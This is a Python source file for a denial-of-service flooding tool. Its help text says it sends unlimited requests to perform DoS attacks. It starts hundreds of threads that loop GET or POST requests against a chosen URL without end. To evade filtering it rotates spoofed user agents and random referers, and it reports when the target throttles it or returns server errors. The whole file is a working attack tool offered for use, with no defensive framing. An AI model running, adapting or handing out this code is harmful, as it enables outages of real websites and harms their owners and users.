import requests
import sys
import threading
import random
import re
import argparse

host=''
headers_useragents=[]
request_counter=0
printedMsgs = []

def printMsg(msg):
	if msg not in printedMsgs:
		print ("\n"+msg + " after %i requests" % request_counter)
		printedMsgs.append(msg)

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('"iTunes/9.0.2 (Windows; N)')
	headers_useragents.append("Avant Browser/1.2.789rel1 (http://www.avantbrowser.com")
	headers_useragents.append('"Baiduspider ( http://www.baidu.com/search/spider.htm')
	headers_useragents.append('"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103')
	headers_useragents.append('"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0')
	headers_useragents.append('"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100')
	headers_useragents.append('"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105')
	headers_useragents.append('"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102')
	headers_useragents.append('"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0')
	headers_useragents.append('"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123')
	headers_useragents.append('"Bloglines/3.1 (http://www.bloglines.com)')
	headers_useragents.append('"CSSCheck/1.2.2')
	headers_useragents.append('"Dillo/2.0')
	headers_useragents.append('"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)')
	headers_useragents.append('"DoCoMo/2.0 SH901iC(c100;TB;W24H12)')
	headers_useragents.append('"Download Demon/3.5.0.11')
	headers_useragents.append('"ELinks/0.12~pre5-4')
	headers_useragents.append('"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33')
	headers_useragents.append('"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41')
	headers_useragents.append('"EmailWolf 1.00')
	headers_useragents.append('"everyfeed-spider/2.0 (http://www.everyfeed.com')
	headers_useragents.append('"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php')
	headers_useragents.append('"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler')
	headers_useragents.append('"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html')
	headers_useragents.append('"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php')
	headers_useragents.append('"Googlebot/2.1 ( http://www.googlebot.com/bot.html')
	headers_useragents.append('"Googlebot-Image/1.0')
	headers_useragents.append('"Googlebot-News')
	headers_useragents.append('"Googlebot-Video/1.0')
	headers_useragents.append('"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua')
	headers_useragents.append('"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org')
	headers_useragents.append('"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot')
	headers_useragents.append('"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0')
	headers_useragents.append('"HTMLParser/1.6')
	headers_useragents.append('"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2')
	headers_useragents.append('"iTunes/9.0.2 (Windows; N)')
	headers_useragents.append('"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca')
	headers_useragents.append('"Java/1.6.0_13')
	headers_useragents.append('"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0"')
	headers_useragents.append('"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)"')
	headers_useragents.append('"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1"')
	headers_useragents.append('"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"')
	headers_useragents.append('"libwww-perl/5.820"')
	headers_useragents.append('"Links/0.9.1 (Linux 2.4.24; i386;)"')
	headers_useragents.append('"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)"')
	headers_useragents.append('"Links (2.1pre15; Linux 2.4.26 i686; 158x61)"')
	headers_useragents.append('"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)"')
	headers_useragents.append('"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12"')
	headers_useragents.append('"Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d"')
	headers_useragents.append('"Mediapartners-Google"')
	headers_useragents.append('"Microsoft URL Control - 6.00.8862"')
	headers_useragents.append('"Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) "')
	headers_useragents.append('"MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0"')
	headers_useragents.append('"MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0"')
	headers_useragents.append('"MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0"')
	headers_useragents.append('"MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0"')
	headers_useragents.append('"Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1"')
	headers_useragents.append('"Mozilla/2.02E (Win95; U)"')
	headers_useragents.append('"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)"')
	headers_useragents.append('"Mozilla/3.01Gold (Win95; I)"')
	headers_useragents.append('"Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) "')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"')
	headers_useragents.append('"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"')
	headers_useragents.append('"Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0"')
	headers_useragents.append('"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)"')
	headers_useragents.append('"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]"')
	headers_useragents.append('"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)"')
	headers_useragents.append('"Mozilla/4.8 [en] (Windows NT 5.1; U)"')
	headers_useragents.append('"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)"')
	headers_useragents.append('"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"')
	headers_useragents.append('"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1"')
	headers_useragents.append('"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a"')
	headers_useragents.append('"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1"')
	headers_useragents.append('"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)"')
	headers_useragents.append('"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) "')
	headers_useragents.append('"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)"')
	headers_useragents.append('"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0"')
	headers_useragents.append('"Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11"')
	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/4.4; Linux')
	return(headers_useragents)
	
def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def initHeaders():
	useragent_list()
	global headers_useragents, additionalHeaders
	headers = {
				'User-Agent': random.choice(headers_useragents),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
				}

	if additionalHeaders:
		for header in additionalHeaders:
			headers.update({header.split(":")[0]:header.split(":")[1]})
	return headers

def handleStatusCodes(status_code):
	global request_counter
	sys.stdout.write("\r%i requests has been sent" % request_counter)
	sys.stdout.flush()
	if status_code == 429:
			printMsg("You have been throttled")
	if status_code == 500:
		printMsg("Status code 500 received")

def sendGET(url):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		request = requests.get(url, headers=headers)
		# print 'her'
		handleStatusCodes(request.status_code)
	except:
		pass

def sendPOST(url, payload):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		if payload:
			request = requests.post(url, data=payload, headers=headers)
		else:
			request = requests.post(url, headers=headers)
		handleStatusCodes(request.status_code)
	except:
		pass

class SendGETThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url
				sendGET(url)
		except:
			pass

class SendPOSTThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url, payload
				sendPOST(url, payload)
		except:
			pass


# TODO:
# check if the site stop responding and alert

def main(argv):
	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
	args = parser.parse_args()

	global url, payload, additionalHeaders
	additionalHeaders = args.ah
	payload = args.d

	if args.g:
		url = args.g
		for i in range(args.t):
			t = SendGETThread()
			t.start()

	if args.p:
		url = args.p
		for i in range(args.t):
			t = SendPOSTThread()
			t.start()
	
	if len(sys.argv)==1:
		parser.print_help()
		exit()
	
if __name__ == "__main__":
   main(sys.argv[1:])
